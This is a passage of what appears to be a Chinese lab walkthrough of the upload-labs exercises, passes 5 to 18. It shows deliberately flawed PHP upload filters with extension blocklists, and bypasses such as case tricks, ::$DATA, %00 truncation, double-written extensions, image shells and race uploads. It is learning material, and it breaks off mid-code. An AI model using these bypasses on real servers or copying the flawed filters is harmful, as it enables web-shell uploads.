class="string">".pHp5"</span>,</span><br><span class="line">        <span class="string">".pHp4"</span>,<span class="string">".pHp3"</span>,<span class="string">".pHp2"</span>,</span><br><span class="line">        <span class="string">".Html"</span>,<span class="string">".Htm"</span>,<span class="string">".pHtml"</span>,</span><br><span class="line">        <span class="string">".jsp"</span>,<span class="string">".jspa"</span>,<span class="string">".jspx"</span>,</span><br><span class="line">        <span class="string">".jsw"</span>,<span class="string">".jsv"</span>,<span class="string">".jspf"</span>,</span><br><span class="line">        <span class="string">".jtml"</span>,<span class="string">".jSp"</span>,<span class="string">".jSpx"</span>,</span><br><span class="line">        <span class="string">".jSpa"</span>,<span class="string">".jSw"</span>,<span class="string">".jSv"</span>,</span><br><span class="line">        <span class="string">".jSpf"</span>,<span class="string">".jHtml"</span>,<span class="string">".asp"</span>,</span><br><span class="line">        <span class="string">".aspx"</span>,<span class="string">".asa"</span>,<span class="string">".asax"</span>,</span><br><span class="line">        <span class="string">".ascx"</span>,<span class="string">".ashx"</span>,<span class="string">".asmx"</span>,</span><br><span class="line">        <span class="string">".cer"</span>,<span class="string">".aSp"</span>,<span class="string">".aSpx"</span>,</span><br><span class="line">        <span class="string">".aSa"</span>,<span class="string">".aSax"</span>,<span class="string">".aScx"</span>,</span><br><span class="line">        <span class="string">".aShx"</span>,<span class="string">".aSmx"</span>,<span class="string">".cEr"</span>,<span class="string">".sWf"</span>,<span class="string">".swf"</span>,<span class="string">".htaccess"</span>);</span><br><span class="line">        $file_name = trim($_FILES[<span class="string">'upload_file'</span>][<span class="string">'name'</span>]);</span><br><span class="line">        $file_name = deldot($file_name);<span class="comment">//删除文件名末尾的点</span></span><br><span class="line">        $file_ext = strrchr($file_name, <span class="string">'.'</span>);</span><br><span class="line">        $file_ext = str_ireplace(<span class="string">'::$DATA'</span>, <span class="string">''</span>, $file_ext);<span class="comment">//去除字符串::$DATA</span></span><br><span class="line">        $file_ext = trim($file_ext); <span class="comment">//首尾去空</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (!in_array($file_ext, $deny_ext)) &#123;</span><br><span class="line">            $temp_file = $_FILES[<span class="string">'upload_file'</span>][<span class="string">'tmp_name'</span>];</span><br><span class="line">            $img_path = UPLOAD_PATH.<span class="string">'/'</span>.date(<span class="string">"YmdHis"</span>).rand(<span class="number">1000</span>,<span class="number">9999</span>).$file_ext;</span><br><span class="line">            <span class="keyword">if</span> (move_uploaded_file($temp_file, $img_path)) &#123;</span><br><span class="line">                $is_upload = <span class="keyword">true</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                $msg = <span class="string">'上传出错！'</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            $msg = <span class="string">'此文件类型不允许上传！'</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        $msg = UPLOAD_PATH . <span class="string">'文件夹不存在,请手工创建！'</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>显然没有过滤后缀名的大小写，尝试Php，可以得到phpinfo.Php<br>还有一种过waf的方法就是双写::$DATA，可以得到xxx.php</p>
<h3 id="pass-6"><a href="#pass-6" class="headerlink" title="pass 6"></a>pass 6</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line">$is_upload = <span class="keyword">false</span>;</span><br><span class="line">$msg = <span class="keyword">null</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_POST[<span class="string">'submit'</span>])) &#123;</span><br><span class="line">    <span class="keyword">if</span> (file_exists(UPLOAD_PATH)) &#123;</span><br><span class="line">        $deny_ext = <span class="keyword">array</span>(<span class="string">".php"</span>,<span class="string">".php5"</span>,<span class="string">".php4"</span>,</span><br><span class="line">        <span class="string">".php3"</span>,<span class="string">".php2"</span>,<span class="string">".html"</span>,<span class="string">".htm"</span>,<span class="string">".phtml"</span>,</span><br><span class="line">        <span class="string">".pht"</span>,<span class="string">".pHp"</span>,<span class="string">".pHp5"</span>,<span class="string">".pHp4"</span>,<span class="string">".pHp3"</span>,</span><br><span class="line">        <span class="string">".pHp2"</span>,<span class="string">".Html"</span>,<span class="string">".Htm"</span>,<span class="string">".pHtml"</span>,<span class="string">".jsp"</span>,</span><br><span class="line">        <span class="string">".jspa"</span>,<span class="string">".jspx"</span>,<span class="string">".jsw"</span>,<span class="string">".jsv"</span>,<span class="string">".jspf"</span>,</span><br><span class="line">        <span class="string">".jtml"</span>,<span class="string">".jSp"</span>,<span class="string">".jSpx"</span>,<span class="string">".jSpa"</span>,<span class="string">".jSw"</span>,</span><br><span class="line">        <span class="string">".jSv"</span>,<span class="string">".jSpf"</span>,<span class="string">".jHtml"</span>,<span class="string">".asp"</span>,<span class="string">".aspx"</span>,</span><br><span class="line">        <span class="string">".asa"</span>,<span class="string">".asax"</span>,<span class="string">".ascx"</span>,<span class="string">".ashx"</span>,<span class="string">".asmx"</span>,</span><br><span class="line">        <span class="string">".cer"</span>,<span class="string">".aSp"</span>,<span class="string">".aSpx"</span>,<span class="string">".aSa"</span>,<span class="string">".aSax"</span>,</span><br><span class="line">        <span class="string">".aScx"</span>,<span class="string">".aShx"</span>,<span class="string">".aSmx"</span>,<span class="string">".cEr"</span>,<span class="string">".sWf"</span>,</span><br><span class="line">        <span class="string">".swf"</span>,<span class="string">".htaccess"</span>);</span><br><span class="line">        $file_name = $_FILES[<span class="string">'upload_file'</span>][<span class="string">'name'</span>];</span><br><span class="line">        $file_name = deldot($file_name);<span class="comment">//删除文件名末尾的点</span></span><br><span class="line">        $file_ext = strrchr($file_name, <span class="string">'.'</span>);</span><br><span class="line">        $file_ext = strtolower($file_ext); <span class="comment">//转换为小写</span></span><br><span class="line">        $file_ext = str_ireplace(<span class="string">'::$DATA'</span>, <span class="string">''</span>, $file_ext);</span><br><span class="line">        <span class="comment">//去除字符串::$DATA</span></span><br><span class="line">        </span><br><span class="line">        <span class="keyword">if</span> (!in_array($file_ext, $deny_ext)) &#123;</span><br><span class="line">            $temp_file = $_FILES[<span class="string">'upload_file'</span>][<span class="string">'tmp_name'</span>];</span><br><span class="line">            $img_path = UPLOAD_PATH.<span class="string">'/'</span>.date(<span class="string">"YmdHis"</span>).rand(<span class="number">1000</span>,<span class="number">9999</span>).$file_ext;</span><br><span class="line">            <span class="keyword">if</span> (move_uploaded_file($temp_file,$img_path)) &#123;</span><br><span class="line">                $is_upload = <span class="keyword">true</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                $msg = <span class="string">'上传出错！'</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            $msg = <span class="string">'此文件不允许上传'</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        $msg = UPLOAD_PATH . <span class="string">'文件夹不存在,请手工创建！'</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>审计代码发现比起上一关的代码减少了对后缀名前后的空格的过滤，那么修改后缀名为phpinfo.php(空格) 即可</p>
<h3 id="pass-7"><a href="#pass-7" class="headerlink" title="pass 7"></a>pass 7</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">$is_upload = <span class="keyword">false</span>;</span><br><span class="line">$msg = <span class="keyword">null</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_POST[<span class="string">'submit'</span>])) &#123;</span><br><span class="line">    <span class="keyword">if</span> (file_exists(UPLOAD_PATH)) &#123;</span><br><span class="line">        $deny_ext = <span class="keyword">array</span>(<span class="string">".php"</span>,<span class="string">".php5"</span>,<span class="string">".php4"</span>,<span class="string">".php3"</span>,<span class="string">".php2"</span>,<span class="string">".html"</span>,<span class="string">".htm"</span>,<span class="string">".phtml"</span>,<span class="string">".pht"</span>,<span class="string">".pHp"</span>,<span class="string">".pHp5"</span>,<span class="string">".pHp4"</span>,<span class="string">".pHp3"</span>,<span class="string">".pHp2"</span>,<span class="string">".Html"</span>,<span class="string">".Htm"</span>,<span class="string">".pHtml"</span>,<span class="string">".jsp"</span>,<span class="string">".jspa"</span>,<span class="string">".jspx"</span>,<span class="string">".jsw"</span>,<span class="string">".jsv"</span>,<span class="string">".jspf"</span>,<span class="string">".jtml"</span>,<span class="string">".jSp"</span>,<span class="string">".jSpx"</span>,<span class="string">".jSpa"</span>,<span class="string">".jSw"</span>,<span class="string">".jSv"</span>,<span class="string">".jSpf"</span>,<span class="string">".jHtml"</span>,<span class="string">".asp"</span>,<span class="string">".aspx"</span>,<span class="string">".asa"</span>,<span class="string">".asax"</span>,<span class="string">".ascx"</span>,<span class="string">".ashx"</span>,<span class="string">".asmx"</span>,<span class="string">".cer"</span>,<span class="string">".aSp"</span>,<span class="string">".aSpx"</span>,<span class="string">".aSa"</span>,<span class="string">".aSax"</span>,<span class="string">".aScx"</span>,<span class="string">".aShx"</span>,<span class="string">".aSmx"</span>,<span class="string">".cEr"</span>,<span class="string">".sWf"</span>,<span class="string">".swf"</span>,<span class="string">".htaccess"</span>);</span><br><span class="line">        $file_name = trim($_FILES[<span class="string">'upload_file'</span>][<span class="string">'name'</span>]);</span><br><span class="line">        $file_ext = strrchr($file_name, <span class="string">'.'</span>);</span><br><span class="line">        $file_ext = strtolower($file_ext); <span class="comment">//转换为小写</span></span><br><span class="line">        $file_ext = str_ireplace(<span class="string">'::$DATA'</span>, <span class="string">''</span>, $file_ext);<span class="comment">//去除字符串::$DATA</span></span><br><span class="line">        $file_ext = trim($file_ext); <span class="comment">//首尾去空</span></span><br><span class="line">        </span><br><span class="line">        <span class="keyword">if</span> (!in_array($file_ext, $deny_ext)) &#123;</span><br><span class="line">            $temp_file = $_FILES[<span class="string">'upload_file'</span>][<span class="string">'tmp_name'</span>];</span><br><span class="line">            $img_path = UPLOAD_PATH.<span class="string">'/'</span>.$file_name;</span><br><span class="line">            <span class="keyword">if</span> (move_uploaded_file($temp_file, $img_path)) &#123;</span><br><span class="line">                $is_upload = <span class="keyword">true</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                $msg = <span class="string">'上传出错！'</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            $msg = <span class="string">'此文件类型不允许上传！'</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        $msg = UPLOAD_PATH . <span class="string">'文件夹不存在,请手工创建！'</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>比较这一题的代码和上一题的代码主要有两个不通点，一个自然是过滤了空格，另外一个则是在拼接img_path时，$file_name并没有采取随机数重命名的方式而采用了原名，这样就给双后缀名绕过提供了机会。因为$file_ext是最后一个.开始到结束的字符串，而这题中原文件名并没有被处理，如果上一部分包含了.php等后缀名便可被解析。<br>尝试phpinfo.php.</p>
<p>这里还有一种方法就是利用apache的解析漏洞,如果文件后缀名apache无法解析,那么apache就会从已解析的后缀名往左解析例如phpinfo.php.xxx无法解析，那么apache便会解析.php，然而我试了下好像没有用。</p>
<p>另外一种方法就是00截断，这种方法我想待会一起讨论</p>
<h3 id="pass-8"><a href="#pass-8" class="headerlink" title="pass 8"></a>pass 8</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">$deny_ext = <span class="keyword">array</span>(<span class="string">".php"</span>,<span class="string">".php5"</span>,<span class="string">".php4"</span>,<span class="string">".php3"</span>,<span class="string">".php2"</span>,<span class="string">".html"</span>,<span class="string">".htm"</span>,<span class="string">".phtml"</span>,<span class="string">".pht"</span>,<span class="string">".pHp"</span>,<span class="string">".pHp5"</span>,<span class="string">".pHp4"</span>,<span class="string">".pHp3"</span>,<span class="string">".pHp2"</span>,<span class="string">".Html"</span>,<span class="string">".Htm"</span>,<span class="string">".pHtml"</span>,<span class="string">".jsp"</span>,<span class="string">".jspa"</span>,<span class="string">".jspx"</span>,<span class="string">".jsw"</span>,<span class="string">".jsv"</span>,<span class="string">".jspf"</span>,<span class="string">".jtml"</span>,<span class="string">".jSp"</span>,<span class="string">".jSpx"</span>,<span class="string">".jSpa"</span>,<span class="string">".jSw"</span>,<span class="string">".jSv"</span>,<span class="string">".jSpf"</span>,<span class="string">".jHtml"</span>,<span class="string">".asp"</span>,<span class="string">".aspx"</span>,<span class="string">".asa"</span>,<span class="string">".asax"</span>,<span class="string">".ascx"</span>,<span class="string">".ashx"</span>,<span class="string">".asmx"</span>,<span class="string">".cer"</span>,<span class="string">".aSp"</span>,<span class="string">".aSpx"</span>,<span class="string">".aSa"</span>,<span class="string">".aSax"</span>,<span class="string">".aScx"</span>,<span class="string">".aShx"</span>,<span class="string">".aSmx"</span>,<span class="string">".cEr"</span>,<span class="string">".sWf"</span>,<span class="string">".swf"</span>,<span class="string">".htaccess"</span>);</span><br><span class="line">        $file_name = trim($_FILES[<span class="string">'upload_file'</span>][<span class="string">'name'</span>]);</span><br><span class="line">        $file_name = deldot($file_name);<span class="comment">//删除文件名末尾的点</span></span><br><span class="line">        $file_ext = strrchr($file_name, <span class="string">'.'</span>);</span><br><span class="line">        $file_ext = strtolower($file_ext); <span class="comment">//转换为小写</span></span><br><span class="line">        $file_ext = trim($file_ext); <span class="comment">//首尾去空</span></span><br></pre></td></tr></table></figure>

<p>显然这题没有过滤::$DATA，那么就用 ::$DATA绕过即可</p>
<h3 id="pass-9"><a href="#pass-9" class="headerlink" title="pass 9"></a>pass 9</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">$is_upload = <span class="keyword">false</span>;</span><br><span class="line">$msg = <span class="keyword">null</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_POST[<span class="string">'submit'</span>])) &#123;</span><br><span class="line">    <span class="keyword">if</span> (file_exists(UPLOAD_PATH)) &#123;</span><br><span class="line">        $deny_ext = <span class="keyword">array</span>(<span class="string">".php"</span>,<span class="string">".php5"</span>,<span class="string">".php4"</span>,<span class="string">".php3"</span>,<span class="string">".php2"</span>,<span class="string">".html"</span>,<span class="string">".htm"</span>,<span class="string">".phtml"</span>,<span class="string">".pht"</span>,<span class="string">".pHp"</span>,<span class="string">".pHp5"</span>,<span class="string">".pHp4"</span>,<span class="string">".pHp3"</span>,<span class="string">".pHp2"</span>,<span class="string">".Html"</span>,<span class="string">".Htm"</span>,<span class="string">".pHtml"</span>,<span class="string">".jsp"</span>,<span class="string">".jspa"</span>,<span class="string">".jspx"</span>,<span class="string">".jsw"</span>,<span class="string">".jsv"</span>,<span class="string">".jspf"</span>,<span class="string">".jtml"</span>,<span class="string">".jSp"</span>,<span class="string">".jSpx"</span>,<span class="string">".jSpa"</span>,<span class="string">".jSw"</span>,<span class="string">".jSv"</span>,<span class="string">".jSpf"</span>,<span class="string">".jHtml"</span>,<span class="string">".asp"</span>,<span class="string">".aspx"</span>,<span class="string">".asa"</span>,<span class="string">".asax"</span>,<span class="string">".ascx"</span>,<span class="string">".ashx"</span>,<span class="string">".asmx"</span>,<span class="string">".cer"</span>,<span class="string">".aSp"</span>,<span class="string">".aSpx"</span>,<span class="string">".aSa"</span>,<span class="string">".aSax"</span>,<span class="string">".aScx"</span>,<span class="string">".aShx"</span>,<span class="string">".aSmx"</span>,<span class="string">".cEr"</span>,<span class="string">".sWf"</span>,<span class="string">".swf"</span>,<span class="string">".htaccess"</span>);</span><br><span class="line">        $file_name = trim($_FILES[<span class="string">'upload_file'</span>][<span class="string">'name'</span>]);</span><br><span class="line">        $file_name = deldot($file_name);<span class="comment">//删除文件名末尾的点</span></span><br><span class="line">        $file_ext = strrchr($file_name, <span class="string">'.'</span>);</span><br><span class="line">        $file_ext = strtolower($file_ext); <span class="comment">//转换为小写</span></span><br><span class="line">        $file_ext = str_ireplace(<span class="string">'::$DATA'</span>, <span class="string">''</span>, $file_ext);<span class="comment">//去除字符串::$DATA</span></span><br><span class="line">        $file_ext = trim($file_ext); <span class="comment">//首尾去空</span></span><br><span class="line">        </span><br><span class="line">        <span class="keyword">if</span> (!in_array($file_ext, $deny_ext)) &#123;</span><br><span class="line">            $temp_file = $_FILES[<span class="string">'upload_file'</span>][<span class="string">'tmp_name'</span>];</span><br><span class="line">            $img_path = UPLOAD_PATH.<span class="string">'/'</span>.$file_name;</span><br><span class="line">            <span class="keyword">if</span> (move_uploaded_file($temp_file, $img_path)) &#123;</span><br><span class="line">                $is_upload = <span class="keyword">true</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                $msg = <span class="string">'上传出错！'</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            $msg = <span class="string">'此文件类型不允许上传！'</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        $msg = UPLOAD_PATH . <span class="string">'文件夹不存在,请手工创建！'</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这一题没有重写文件名，故可以采用phpinfo.php. .尝试绕过（$file_ext=(空格)）</p>
<h3 id="pass-10"><a href="#pass-10" class="headerlink" title="pass 10"></a>pass 10</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">$is_upload = <span class="keyword">false</span>;</span><br><span class="line">$msg = <span class="keyword">null</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_POST[<span class="string">'submit'</span>])) &#123;</span><br><span class="line">    <span class="keyword">if</span> (file_exists(UPLOAD_PATH)) &#123;</span><br><span class="line">        $deny_ext = <span class="keyword">array</span>(<span class="string">"php"</span>,<span class="string">"php5"</span>,<span class="string">"php4"</span>,<span class="string">"php3"</span>,</span><br><span class="line">        <span class="string">"php2"</span>,<span class="string">"html"</span>,<span class="string">"htm"</span>,<span class="string">"phtml"</span>,<span class="string">"pht"</span>,<span class="string">"jsp"</span>,</span><br><span class="line">        <span class="string">"jspa"</span>,<span class="string">"jspx"</span>,<span class="string">"jsw"</span>,<span class="string">"jsv"</span>,<span class="string">"jspf"</span>,<span class="string">"jtml"</span>,</span><br><span class="line">        <span class="string">"asp"</span>,<span class="string">"aspx"</span>,<span class="string">"asa"</span>,<span class="string">"asax"</span>,<span class="string">"ascx"</span>,<span class="string">"ashx"</span>,</span><br><span class="line">        <span class="string">"asmx"</span>,<span class="string">"cer"</span>,<span class="string">"swf"</span>,<span class="string">"htaccess"</span>);</span><br><span class="line"></span><br><span class="line">        $file_name = trim($_FILES[<span class="string">'upload_file'</span>][<span class="string">'name'</span>]);</span><br><span class="line">        $file_name = str_ireplace($deny_ext,<span class="string">""</span>, $file_name);</span><br><span class="line">        $temp_file = $_FILES[<span class="string">'upload_file'</span>][<span class="string">'tmp_name'</span>];</span><br><span class="line">        $img_path = UPLOAD_PATH.<span class="string">'/'</span>.$file_name;        </span><br><span class="line">        <span class="keyword">if</span> (move_uploaded_file($temp_file, $img_path)) &#123;</span><br><span class="line">            $is_upload = <span class="keyword">true</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            $msg = <span class="string">'上传出错！'</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        $msg = UPLOAD_PATH . <span class="string">'文件夹不存在,请手工创建！'</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>看到str_ireplace 方法的时候就可以想到双写绕过了，故phpinfo.phphpp过</p>
<h3 id="pass-11-12"><a href="#pass-11-12" class="headerlink" title="pass 11-12"></a>pass 11-12</h3><p>这两题的共同特点是通过%00截断过waf<br>抓包或者审计源码可以发现</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">$ext_arr = <span class="keyword">array</span>(<span class="string">'jpg'</span>,<span class="string">'png'</span>,<span class="string">'gif'</span>);</span><br><span class="line">$file_ext = substr($_FILES[<span class="string">'upload_file'</span>][<span class="string">'name'</span>],strrpos($_FILES[<span class="string">'upload_file'</span>][<span class="string">'name'</span>],<span class="string">"."</span>)+<span class="number">1</span>);</span><br><span class="line"><span class="keyword">if</span>(!in_array($file_ext,$ext_arr))&#123;</span><br><span class="line">    $img_path = ($_POST[<span class="string">'save_path'</span>]或者$_GET[<span class="string">'save_path'</span>]).<span class="string">"/"</span>.rand(<span class="number">10</span>, <span class="number">99</span>).date(<span class="string">"YmdHis"</span>).<span class="string">"."</span>.$file_ext;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>是白名单加上传递参数定义存储文件路径<br>这里save_path可以被修改，如果传入/upload/phpinfo.php%00.jpg<br>在move_upload_path函数中%00会产生截断字符串的效果，从而实际写入路径变为/upload/phpinfo.php绕过成功</p>
<p>00截断的要求有两个，一个是php版本小于5.3.4，另外一个是php的magic_quotes_gpc必须关闭，因为它会过滤get和post的请求中的\</p>
<p>%00在路径中被解析后，字符串会变为phpinfo.php\000.jpg，而\000在c语言中是终止符，因为php的底层实现四c语言，所以会产生这样的结果。</p>
<p>%00在get,post，甚至cookie都有效</p>
<p>如果需要在文件命中使用截断，则需要使用修改.php后的字节，例如.php(0x00).jpg格式（输入的时候不需要括号，可以在bp中hex内改）</p>
<h3 id="pass-13-15"><a href="#pass-13-15" class="headerlink" title="pass 13-15"></a>pass 13-15</h3><p>内容检查图片码<br>制作方法<br>cat xxx.jpg xxx.php&gt; xxx.php</p>
<p>上传的时候需要修改后缀名和mime type</p>
<h3 id="pass-16"><a href="#pass-16" class="headerlink" title="pass 16"></a>pass 16</h3><p>二次渲染</p>
<p>gif上传之后和自己制作的图片码比较，将代码插入没有变化的位置。</p>
<p>png和jpg上传都是采用了现成脚本<br>参考了这篇文章 <a href="https://xz.aliyun.com/t/2657#toc-4" target="_blank" rel="noopener">https://xz.aliyun.com/t/2657#toc-4</a></p>
<h3 id="pass-17"><a href="#pass-17" class="headerlink" title="pass 17"></a>pass 17</h3><p>竞争上传,主要的问题是使用move_uploaded_file之后rename，rename耗时较多，故上传线程开到5-6，然后浏览器多访问几次就成功。</p>
<h3 id="pass-18"><a href="#pass-18" class="headerlink" title="pass 18"></a>pass 18</h3><p>这段代码的逻辑其实是和17很相似，核心的问题是在move()和rename()这里</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//index.php</span></span><br><span class="line">$is_upload = <span class="keyword">false</span>;</span><br><span class="line">$msg = <span class="keyword">null</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_POST[<span class="string">'submit'</span>]))</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">require_once</span>(<span class="string">"./myupload.php"</span>);</span><br><span class="line">    $imgFileName =time();</span><br><span class="line">    $u = <span class="keyword">new</span> MyUpload($_FILES[<span class="string">'upload_file'</span>][<span class="string">'name'</span>], $_FILES[<span class="string">'upload_file'</span>][<span class="string">'tmp_name'</span>], $_FILES[<span class="string">'upload_file'</span>][<span class="string">'size'</span>],$imgFileName);</span><br><span class="line">    $status_code = $u-&gt;upload(UPLOAD_PATH);</span><br><span class="line">    <span class="keyword">switch</span> ($status_code) &#123;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">1</span>:</span><br><span class="line">            $is_upload = <span class="keyword">true</span>;</span><br><span class="line">            $img_path = $u-&gt;cls_upload_dir . $u-&gt;cls_file_rename_to;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">2</span>:</span><br><span class="line">            $msg = <span class="string">'文件已经被上传，但没有重命名。'</span>;</span><br><span class="line">            <span class="keyword">break</span>; </span><br><span class="line">        <span class="keyword">case</span> <span class="number">-1</span>:</span><br><span class="line">            $msg = <span class="string">'这个文件不能上传到服务器的临时文件存储目录。'</span>;</span><br><span class="line">            <span class="keyword">break</span>; </span><br><span class="line">        <span class="keyword">case</span> <span class="number">-2</span>:</span><br><span class="line">            $msg = <span class="string">'上传失败，上传目录不可写。'</span>;</span><br><span 